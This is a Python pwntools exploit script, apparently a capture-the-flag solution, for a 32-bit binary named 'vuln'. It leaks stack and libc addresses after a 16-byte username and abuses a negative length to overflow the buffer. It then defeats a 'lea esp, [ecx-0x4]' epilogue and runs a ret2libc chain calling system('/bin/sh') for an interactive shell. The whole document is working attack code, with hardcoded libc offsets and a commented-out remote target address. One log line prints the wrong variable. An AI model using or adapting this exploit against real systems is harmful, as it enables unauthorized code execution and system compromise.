from pwn import *

stack_offset = 100
printf_plt = 0x80484B0
read_got = 0x804a010

#r = process("./vuln", env={"LD_PRELOAD":"./libc.so.6"})
#r = remote("35.198.98.140", 45067)
r = remote("127.0.0.1", 1337)

r.recvuntil("Enter username: ")
r.send("A"*16)
s = r.recvuntil("Enter length: ")

index = s.find("AAAAAAAAAAAAAAAA")+16
stack_leak = u32(s[index:index+4])
libc_leak = u32(s[index+4:index+8])

#this leak is only possible in debian (check libc version ./libc.so.6)
log.info("Stack leak: %s" % hex(stack_leak))
log.info("libc leak: %s" % hex(stack_leak))

r.sendline("-1")
r.recvuntil("): ")

system = libc_leak + 187176
bin_sh = system + 1189128

rop = p32(system)
rop += p32(bin_sh)
rop += p32(bin_sh)

#bypass lea esp, [ecx-0x4]
str_addr = p32(stack_leak-100+4) #ecx-4
r.send(rop.ljust(0x50, "A") + str_addr)

r.interactive()
